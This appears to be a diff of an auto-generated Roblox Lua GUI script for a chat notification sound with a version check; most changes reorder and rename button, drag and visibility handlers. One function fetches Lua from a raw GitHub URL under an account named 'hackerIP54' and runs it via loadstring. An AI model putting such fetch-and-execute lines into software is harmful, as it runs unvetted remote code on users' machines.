@@ -263,7 +263,38 @@ UICorner_14.Parent = fghj
 
 -- Scripts:
 
-local function YQFLN_fake_script() -- Main.LocalScript 
+local function IAJPF_fake_script() -- SoundForChat5.fgnm 
+	local script = Instance.new('LocalScript', SoundForChat5)
+
+	local url = "https://raw.githubusercontent.com/hackerIP54/Chat-Notify-sound/main/version.lua"
+	
+	local success, err = pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/hackerIP54/Chat-Notify-sound/main/version.lua"))()
+	end)
+	
+	if not success then
+		warn("Loadstring fehlgeschlagen:", err)
+	
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = "Fehler";
+			Text = "Script konnte nicht geladen werden!";
+			Duration = 4;
+		})
+		wait(4)
+		script.Parent:Destroy()
+	else
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = "Success";
+			Text = "Script geladen! bitte warte";
+			Duration = 4;
+		})
+		
+	end
+	
+	
+end
+coroutine.wrap(IAJPF_fake_script)()
+local function MIRLDS_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	local TextChatService = game:GetService("TextChatService")
@@ -305,25 +336,8 @@ local function YQFLN_fake_script() -- Main.LocalScript
 	
 	
 end
-coroutine.wrap(YQFLN_fake_script)()
-local function OJVLNM_fake_script() -- Close34.LocalScript 
-	local script = Instance.new('LocalScript', Close34)
-
-	script.Parent.MouseButton1Click:Once(function()
-	script.Parent.Parent.Parent:Destroy()
-	end)
-end
-coroutine.wrap(OJVLNM_fake_script)()
-local function QBCER_fake_script() -- Close34e.LocalScript 
-	local script = Instance.new('LocalScript', Close34e)
-
-	script.Parent.MouseButton1Click:Once(function()
-		script.Parent.Parent.Parent:WaitForChild("Main").Visible = false
-		script.Parent.Parent.Parent:WaitForChild("dfghj").Visible = true
-	end)
-end
-coroutine.wrap(QBCER_fake_script)()
-local function OMJZGE_fake_script() -- Main.Drag2 
+coroutine.wrap(MIRLDS_fake_script)()
+local function EUWXE_fake_script() -- Main.Drag2 
 	local script = Instance.new('LocalScript', Main)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -366,53 +380,25 @@ local function OMJZGE_fake_script() -- Main.Drag2
 		end
 	end)
 end
-coroutine.wrap(OMJZGE_fake_script)()
-local function QCVOX_fake_script() -- UpdateFrame1.jjdjjd 
-	local script = Instance.new('LocalScript', UpdateFrame1)
-
-	local HttpService = game:GetService("HttpService")
-	
-	local TextBox1 = script.Parent:WaitForChild("Link")
-	local Link =  ''
-	
-	TextBox1.Changed:Connect(function()
-		if TextBox1.Text ~= Link then
-			TextBox1.Text = Link
-		end
-		
-	end)
-	
-	
-	
-end
-coroutine.wrap(QCVOX_fake_script)()
-local function CGGDD_fake_script() -- Close.LocalScript 
-	local script = Instance.new('LocalScript', Close)
-
-	script.Parent.MouseButton1Click:Once(function()
-	script.Parent.Parent.Parent.Parent:Destroy()
-	end)
-end
-coroutine.wrap(CGGDD_fake_script)()
-local function KPDHL_fake_script() -- Close_2.LocalScript 
-	local script = Instance.new('LocalScript', Close_2)
+coroutine.wrap(EUWXE_fake_script)()
+local function JTQF_fake_script() -- Close34.LocalScript 
+	local script = Instance.new('LocalScript', Close34)
 
 	script.Parent.MouseButton1Click:Once(function()
 	script.Parent.Parent.Parent:Destroy()
 	end)
 end
-coroutine.wrap(KPDHL_fake_script)()
-local function YZDCLX_fake_script() -- LinkForFrame.6565 
-	local script = Instance.new('LocalScript', LinkForFrame)
+coroutine.wrap(JTQF_fake_script)()
+local function TADWRD_fake_script() -- Close34e.LocalScript 
+	local script = Instance.new('LocalScript', Close34e)
 
-	script.Parent.MouseButton1Click:Connect(function()  
-	script.Parent.Parent:WaitForChild("UpdateFrame1").Visible = true
-	script.Parent.Visible = false
-	script.Parent.Parent:WaitForChild("Close").Visible = false
+	script.Parent.MouseButton1Click:Once(function()
+		script.Parent.Parent.Parent:WaitForChild("Main").Visible = false
+		script.Parent.Parent.Parent:WaitForChild("dfghj").Visible = true
 	end)
 end
-coroutine.wrap(YZDCLX_fake_script)()
-local function DZGUCJY_fake_script() -- UpdateF.Drag2 
+coroutine.wrap(TADWRD_fake_script)()
+local function JOQNF_fake_script() -- UpdateF.Drag2 
 	local script = Instance.new('LocalScript', UpdateF)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -455,49 +441,53 @@ local function DZGUCJY_fake_script() -- UpdateF.Drag2
 		end
 	end)
 end
-coroutine.wrap(DZGUCJY_fake_script)()
-local function KIHUIU_fake_script() -- SoundForChat5.fgnm 
-	local script = Instance.new('LocalScript', SoundForChat5)
+coroutine.wrap(JOQNF_fake_script)()
+local function TEDD_fake_script() -- UpdateFrame1.jjdjjd 
+	local script = Instance.new('LocalScript', UpdateFrame1)
 
-	local url = "https://raw.githubusercontent.com/hackerIP54/Chat-Notify-sound/main/version.lua"
+	local HttpService = game:GetService("HttpService")
 	
-	local success, err = pcall(function()
-		loadstring(game:HttpGet(url))()
+	local TextBox1 = script.Parent:WaitForChild("Link")
+	local Link =  ''
+	
+	TextBox1.Changed:Connect(function()
+		if TextBox1.Text ~= Link then
+			TextBox1.Text = Link
+		end
+		
 	end)
 	
-	if not success then
-		warn("Loadstring fehlgeschlagen:", err)
-	
-		game:GetService("StarterGui"):SetCore("SendNotification", {
-			Title = "Fehler";
-			Text = "Script konnte nicht geladen werden!";
-			Duration = 4;
-		})
-		wait(4)
-		script.Parent:Destroy()
-	else
-		game:GetService("StarterGui"):SetCore("SendNotification", {
-			Title = "Success";
-			Text = "Script geladen! bitte warte";
-			Duration = 4;
-		})
-		
-	end
 	
 	
 end
-coroutine.wrap(KIHUIU_fake_script)()
-local function DVVEBZ_fake_script() -- dfghje.LocalScript 
-	local script = Instance.new('LocalScript', dfghje)
+coroutine.wrap(TEDD_fake_script)()
+local function SCEYG_fake_script() -- Close.LocalScript 
+	local script = Instance.new('LocalScript', Close)
 
 	script.Parent.MouseButton1Click:Once(function()
-		script.Parent.Parent.Parent:WaitForChild("Main").Visible = true
-		script.Parent.Parent.Parent:WaitForChild("dfghj").Visible = false
+	script.Parent.Parent.Parent.Parent:Destroy()
 	end)
-	
 end
-coroutine.wrap(DVVEBZ_fake_script)()
-local function KRVOZ_fake_script() -- dfghj.Drag2 
+coroutine.wrap(SCEYG_fake_script)()
+local function TENECZV_fake_script() -- Close_2.LocalScript 
+	local script = Instance.new('LocalScript', Close_2)
+
+	script.Parent.MouseButton1Click:Once(function()
+	script.Parent.Parent.Parent:Destroy()
+	end)
+end
+coroutine.wrap(TENECZV_fake_script)()
+local function IQXLLWY_fake_script() -- LinkForFrame.6565 
+	local script = Instance.new('LocalScript', LinkForFrame)
+
+	script.Parent.MouseButton1Click:Connect(function()  
+	script.Parent.Parent:WaitForChild("UpdateFrame1").Visible = true
+	script.Parent.Visible = false
+	script.Parent.Parent:WaitForChild("Close").Visible = false
+	end)
+end
+coroutine.wrap(IQXLLWY_fake_script)()
+local function VFQAK_fake_script() -- dfghj.Drag2 
 	local script = Instance.new('LocalScript', dfghj)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -540,4 +530,32 @@ local function KRVOZ_fake_script() -- dfghj.Drag2
 		end
 	end)
 end
-coroutine.wrap(KRVOZ_fake_script)()
+coroutine.wrap(VFQAK_fake_script)()
+local function OOZHMV_fake_script() -- dfghje.LocalScript 
+	local script = Instance.new('LocalScript', dfghje)
+
+	script.Parent.MouseButton1Click:Once(function()
+		script.Parent.Parent.Parent:WaitForChild("Main").Visible = true
+		script.Parent.Parent.Parent:WaitForChild("dfghj").Visible = false
+	end)
+	
+end
+coroutine.wrap(OOZHMV_fake_script)()
+local function GVHAEC_fake_script() -- SoundForChat5.LocalScript 
+	local script = Instance.new('LocalScript', SoundForChat5)
+
+	local Version = "1.0.0"	
+	local Textlabel = script.Parent:WaitForChild("VersionCheck")
+	
+	Textlabel.Changed:Connect(function() 
+		if Textlabel.Text == Version then
+			script.Parent:WaitForChild("Main").Visible = true
+			script:Destroy()
+		else 
+			script.Parent:WaitForChild("UpdateF").Visible = true
+			script:Destroy()
+		end
+	end)
+	
+end
+coroutine.wrap(GVHAEC_fake_script)()
